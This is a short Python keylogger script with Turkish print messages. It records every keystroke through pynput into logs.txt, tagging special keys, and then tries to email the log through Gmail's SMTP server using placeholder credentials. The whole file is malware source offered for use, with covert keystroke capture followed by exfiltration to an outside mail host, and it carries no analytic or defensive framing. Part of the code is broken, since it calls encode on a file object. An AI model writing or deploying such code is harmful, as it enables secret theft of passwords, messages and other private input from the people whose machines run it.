import pynput.keyboard
import smtplib

log = open("logs.txt", "w")

def callback_function(key):
    try:
        print('Alfanumerik anahtar {0} tuşlandı'.format(key.char))
        log.write(key.char)
        log.flush()
        
    except AttributeError:
        print('Özel anahtar {0} tuşlandı'.format(key))
       
        if key == key.space:
            tus = " "
        elif key == key.enter:
            tus = "\n[ENTER]\n"
        elif key == key.backspace:
            tus="\n[BACKSPACE]"
        elif key == key.tab:
            tus="\n[TAB]"
        elif key == key.caps_lock:
            tus="\n[CAPSLOCK]"
        elif key == key.shift or key == key.shift_r:
            tus="\n[SHIFT]"
        elif key == key.ctrl_l or key == key.ctrl_r:
            tus="\n[CTRL]"
        elif key == key.esc:
            tus="\n[ESC]" 
        else:
            tus = str(key)

        log.write(tus)
        log.flush()


def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()



keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()
    send_email("your mail @gmail.com", 'your password' , log.encode('utf-8'))

log.close()
    
